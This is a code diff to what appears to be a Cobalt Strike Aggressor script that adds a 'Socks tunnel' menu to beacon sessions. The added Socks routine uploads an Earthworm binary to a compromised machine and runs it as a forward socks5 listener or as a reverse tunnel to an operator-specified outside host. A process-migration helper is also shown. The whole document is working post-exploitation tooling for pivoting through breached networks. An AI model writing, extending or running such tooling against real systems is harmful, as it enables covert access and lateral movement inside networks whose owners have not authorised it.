@@ -85,6 +85,26 @@ sub Migrate{
     bshell!($bid,$cmd);
     btask($bid, "migrating process location to ".$dir.$process.", please wait new session !", "");
 }
+sub Socks{
+    local('$type $lport $refhost $refport $rch');
+    $type = $3['type'];
+    $lport = $3['listenport'];
+    $refhost = $3['refhost'];
+    $refport = $3['refport'];
+    $rch = "x86";
+    if (beacon_info($bid,"is64") == 1){
+        $rch = "x64";
+    }
+    bupload!($bid, script_resource("post/ew/ $+ $rch $+ .exe"));
+    if($type eq "Forward"){
+        bshell!($bid, $rch.".exe -s ssocksd -l ".$lport);
+        btask($bid, "Started socks5 server at: ".beacon_info($bid, "external").":".$lport);
+    }
+    else{
+        bshell!($bid, $rch.".exe -s rssocks -d ".$refhost." -e ".$refport);
+        btask($bid, "Started socks5 server at: ".$refhost.":".$refport);
+    }
+}
 #append menus
 
 
@@ -157,6 +177,18 @@ sub Migrate{
                 drow_text($dialog, "dir", "Migrate directory: ");
                 drow_text($dialog, "pname", "Process name: ");
                 drow_checkbox($dialog, "keep", "Keep old connection: ", "");
+                dbutton_action($dialog, "Exec");
+                dialog_show($dialog);
+            }
+
+            item "Socks tunnel"{
+                $bid = $1['@'];
+                $dialog = dialog("Create socks server",%(bid => $bid, listenport => "1080", refhost => "1.1.1.1", refport => "8888"), &Socks);
+                dialog_description($dialog,"Create a forward or reverse socks5 server use Earthworm.");
+                drow_combobox($dialog, "type", "Type: ", @("Forward", "Reverse"));
+                drow_text($dialog, "listenport", "Listen port(-l): ", "");
+                drow_text($dialog, "refhost", "Reflection host address(-d): ", "");
+                drow_text($dialog, "refport", "Reflection port(-e): ", "");
                 dbutton_action($dialog, "Exec");
                 dialog_show($dialog);
             }
